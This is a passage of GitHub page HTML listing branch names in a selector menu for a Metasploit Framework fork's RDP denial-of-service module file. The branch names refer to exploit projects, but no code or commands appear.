                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="ie_cdwnbindinfo_uaf">ie_cdwnbindinfo_uaf</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/ie_w2003/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="ie_w2003"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="ie_w2003">ie_w2003</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/indesign_macosx/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="indesign_macosx"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="indesign_macosx">indesign_macosx</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/indusoft_issymbol_internationalseparator/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="indusoft_issymbol_internationalseparator"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="indusoft_issymbol_internationalseparator">indusoft_issymbol_internationalseparator</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/injector_docx_post/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="injector_docx_post"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="injector_docx_post">injector_docx_post</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/inotes_dwa85w_bof/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="inotes_dwa85w_bof"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="inotes_dwa85w_bof">inotes_dwa85w_bof</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/instantcms/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="instantcms"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="instantcms">instantcms</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/j0hnf-master/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="j0hnf-master"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="j0hnf-master">j0hnf-master</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/j7u17_references/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="j7u17_references"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="j7u17_references">j7u17_references</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/java_0day_refs/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="java_0day_refs"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="java_0day_refs">java_0day_refs</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/java7u17_click2play_bypass/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="java7u17_click2play_bypass"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="java7u17_click2play_bypass">java7u17_click2play_bypass</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/java_cmm/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="java_cmm"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="java_cmm">java_cmm</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/java_jre17_driver_manager/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="java_jre17_driver_manager"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="java_jre17_driver_manager">java_jre17_driver_manager</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/java_jre17_glassfish_averagerangestatisticimpl/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="java_jre17_glassfish_averagerangestatisticimpl"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="java_jre17_glassfish_averagerangestatisticimpl">java_jre17_glassfish_averagerangestatisticimpl</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/java_jre17_jmxbean/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="java_jre17_jmxbean"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="java_jre17_jmxbean">java_jre17_jmxbean</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/java_jre17_jmxbean_2/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="java_jre17_jmxbean_2"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="java_jre17_jmxbean_2">java_jre17_jmxbean_2</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/java_jre17_method_handle/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="java_jre17_method_handle"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="java_jre17_method_handle">java_jre17_method_handle</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/java_store_imagearray/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="java_store_imagearray"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="java_store_imagearray">java_store_imagearray</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/java_store_imagearray_clean/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="java_store_imagearray_clean"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="java_store_imagearray_clean">java_store_imagearray_clean</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/java_ws_double_quote/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="java_ws_double_quote"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="java_ws_double_quote">java_ws_double_quote</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jboss_fix/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jboss_fix"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jboss_fix">jboss_fix</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jenkins_script_console_mod/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jenkins_script_console_mod"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jenkins_script_console_mod">jenkins_script_console_mod</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jgor-lantronix_telnet_password-bugfixes/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jgor-lantronix_telnet_password-bugfixes"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jgor-lantronix_telnet_password-bugfixes">jgor-lantronix_telnet_password-bugfixes</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jlee-r7-cleanup/specs/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jlee-r7-cleanup/specs"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jlee-r7-cleanup/specs">jlee-r7-cleanup/specs</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/joomla_references/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="joomla_references"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="joomla_references">joomla_references</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/joomla_upload/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="joomla_upload"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="joomla_upload">joomla_upload</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/joomla_work/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="joomla_work"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="joomla_work">joomla_work</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jre7u17/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jre7u17"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jre7u17">jre7u17</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jtr_seeding/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jtr_seeding"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jtr_seeding">jtr_seeding</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jvazquez-r7-actfax_local_exploit/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jvazquez-r7-actfax_local_exploit"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jvazquez-r7-actfax_local_exploit">jvazquez-r7-actfax_local_exploit</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jvazquez-r7-allmediaserver_review/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jvazquez-r7-allmediaserver_review"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jvazquez-r7-allmediaserver_review">jvazquez-r7-allmediaserver_review</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jvazquez-r7-apache_activemq_traversal/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jvazquez-r7-apache_activemq_traversal"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jvazquez-r7-apache_activemq_traversal">jvazquez-r7-apache_activemq_traversal</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jvazquez-r7-apple_quicktime_texml_zdi/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jvazquez-r7-apple_quicktime_texml_zdi"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jvazquez-r7-apple_quicktime_texml_zdi">jvazquez-r7-apple_quicktime_texml_zdi</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jvazquez-r7-atlassian_crowd/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jvazquez-r7-atlassian_crowd"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jvazquez-r7-atlassian_crowd">jvazquez-r7-atlassian_crowd</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jvazquez-r7-client_system_analyzer_upload/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jvazquez-r7-client_system_analyzer_upload"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jvazquez-r7-client_system_analyzer_upload">jvazquez-r7-client_system_analyzer_upload</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jvazquez-r7-enum_db/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jvazquez-r7-enum_db"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jvazquez-r7-enum_db">jvazquez-r7-enum_db</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jvazquez-r7-gimp_script_fu/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jvazquez-r7-gimp_script_fu"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jvazquez-r7-gimp_script_fu">jvazquez-r7-gimp_script_fu</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jvazquez-r7-h0ng10-Openfire-auth-bypass/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jvazquez-r7-h0ng10-Openfire-auth-bypass"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jvazquez-r7-h0ng10-Openfire-auth-bypass">jvazquez-r7-h0ng10-Openfire-auth-bypass</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jvazquez-r7-hp_alm_xgo_setshapenodetype_exec/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jvazquez-r7-hp_alm_xgo_setshapenodetype_exec"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jvazquez-r7-hp_alm_xgo_setshapenodetype_exec">jvazquez-r7-hp_alm_xgo_setshapenodetype_exec</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jvazquez-r7-hpdp_new_folder_bof/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jvazquez-r7-hpdp_new_folder_bof"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jvazquez-r7-hpdp_new_folder_bof">jvazquez-r7-hpdp_new_folder_bof</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jvazquez-r7-ie_uaf_js_spray_obfuscate/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jvazquez-r7-ie_uaf_js_spray_obfuscate"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jvazquez-r7-ie_uaf_js_spray_obfuscate">jvazquez-r7-ie_uaf_js_spray_obfuscate</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jvazquez-r7-indusoft_webstudio_exec/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jvazquez-r7-indusoft_webstudio_exec"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jvazquez-r7-indusoft_webstudio_exec">jvazquez-r7-indusoft_webstudio_exec</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jvazquez-r7-invision_pboard_cookie_prefix/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jvazquez-r7-invision_pboard_cookie_prefix"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jvazquez-r7-invision_pboard_cookie_prefix">jvazquez-r7-invision_pboard_cookie_prefix</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jvazquez-r7-invision_pboard_unserialize_exec/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jvazquez-r7-invision_pboard_unserialize_exec"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jvazquez-r7-invision_pboard_unserialize_exec">jvazquez-r7-invision_pboard_unserialize_exec</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jvazquez-r7-keyhelp_launchtripane_exec/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jvazquez-r7-keyhelp_launchtripane_exec"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jvazquez-r7-keyhelp_launchtripane_exec">jvazquez-r7-keyhelp_launchtripane_exec</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jvazquez-r7-lmgrd_overflow/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jvazquez-r7-lmgrd_overflow"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jvazquez-r7-lmgrd_overflow">jvazquez-r7-lmgrd_overflow</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jvazquez-r7-msxml_get_definition_code_exec/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jvazquez-r7-msxml_get_definition_code_exec"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jvazquez-r7-msxml_get_definition_code_exec">jvazquez-r7-msxml_get_definition_code_exec</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jvazquez-r7-ntr_activex_stopmodule/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jvazquez-r7-ntr_activex_stopmodule"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jvazquez-r7-ntr_activex_stopmodule">jvazquez-r7-ntr_activex_stopmodule</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jvazquez-r7-pbot_exec/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jvazquez-r7-pbot_exec"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jvazquez-r7-pbot_exec">jvazquez-r7-pbot_exec</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jvazquez-r7-review_irfanview/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jvazquez-r7-review_irfanview"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jvazquez-r7-review_irfanview">jvazquez-r7-review_irfanview</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jvazquez-r7-sap_host_control_cmd_exec/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jvazquez-r7-sap_host_control_cmd_exec"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jvazquez-r7-sap_host_control_cmd_exec">jvazquez-r7-sap_host_control_cmd_exec</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jvazquez-r7-sap_netweaver_dispatcher/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jvazquez-r7-sap_netweaver_dispatcher"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jvazquez-r7-sap_netweaver_dispatcher">jvazquez-r7-sap_netweaver_dispatcher</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jvazquez-r7-setinfopolicy_heap/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jvazquez-r7-setinfopolicy_heap"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jvazquez-r7-setinfopolicy_heap">jvazquez-r7-setinfopolicy_heap</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jvazquez-r7-sugarcrm_unserialize_exec/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jvazquez-r7-sugarcrm_unserialize_exec"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jvazquez-r7-sugarcrm_unserialize_exec">jvazquez-r7-sugarcrm_unserialize_exec</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jvazquez-r7-tikiwiki_unserialize_rce/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jvazquez-r7-tikiwiki_unserialize_rce"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jvazquez-r7-tikiwiki_unserialize_rce">jvazquez-r7-tikiwiki_unserialize_rce</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jvazquez-r7-umbraco_upload_aspx_rev/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jvazquez-r7-umbraco_upload_aspx_rev"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jvazquez-r7-umbraco_upload_aspx_rev">jvazquez-r7-umbraco_upload_aspx_rev</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jvazquez-r7-zenworks_preboot_op4c_bof/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jvazquez-r7-zenworks_preboot_op4c_bof"
                 data-skip-pjax="true"
                 rel="nofollow"
